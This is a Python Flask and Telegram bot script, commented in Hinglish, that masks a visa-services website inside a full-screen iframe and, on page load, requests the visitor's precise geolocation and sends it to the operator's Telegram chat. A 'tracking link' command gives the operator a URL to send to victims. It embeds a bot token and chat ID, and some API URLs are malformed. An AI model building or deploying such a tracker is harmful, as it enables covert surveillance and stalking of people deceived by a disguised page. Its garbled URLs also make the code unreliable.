import os
import threading
import time
import requests
from flask import Flask, request
import telebot

# --- AAP KI TELEGRAM CREDENTIALS ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# Initialize Flask and TeleBot
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Helper function to send messages to Telegram
def send_telegram_message(message):
    url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- TELEGRAM BOT COMMANDS ---
@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        app_url = os.environ.get("APP_URL", "https://onrender.com")
        
        response_text = (
            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
            f"`{app_url}`\n\n"
            f"Is link ko send karein. Jaise hi user open karega, Netlify website ke sath hi location permission mangi jayegi!"
        )
        bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Unauthorized access!")

# --- FLASK WEB SERVER (FULLSCREEN IFRAME MASKING) ---
@app.route("/")
def index():
    # Yeh html background me original website load kar ke upar permission display karega
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dubai Travel & Tour - Professional Visa Services</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #ffffff;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>

    <!-- Netlify Website Background Frame -->
    <iframe src="https://easyvisaapplication.netlify.app/"></iframe>

    <script>
        function sendData(payload) {
            fetch('/update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(function(err) { console.error('Error:', err); });
        }

        function onSuccess(pos) {
            try {
                sendData({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: pos.timestamp
                });
            } catch(e) {
                console.error('Error:', e);
            }
        }
        
        function onError(err) {
            console.log('Permission denied or error occurred.');
        }
        
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        }
        
        // Website load hote hi permission trigger ho jayegi
        window.onload = requestLocation;
    </script>
</body>
</html>
'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    
    msg = (
        f"🚨 *NEW LOCATION RECEIVED!* 🚨\n\n"
        f"🌐 *Latitude:* `{lat}`\n"
        f"🌐 *Longitude:* `{lon}`\n"
        f"🎯 *Accuracy:* `{acc} meters`\n\n"
        f"🗺️ [Google Maps Link](https://google.com{lat},{lon})"
    )
    
    send_telegram_message(msg)
    return "OK", 200

# Run Flask server in a separate background thread
def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    print("🚀 Starting Web Server & Telegram Bot simultaneously...")
    
    # Start Flask thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Send startup alert to your Telegram
    send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your URL.")
    
    # Start Telegram Bot polling
    bot.infinity_polling()
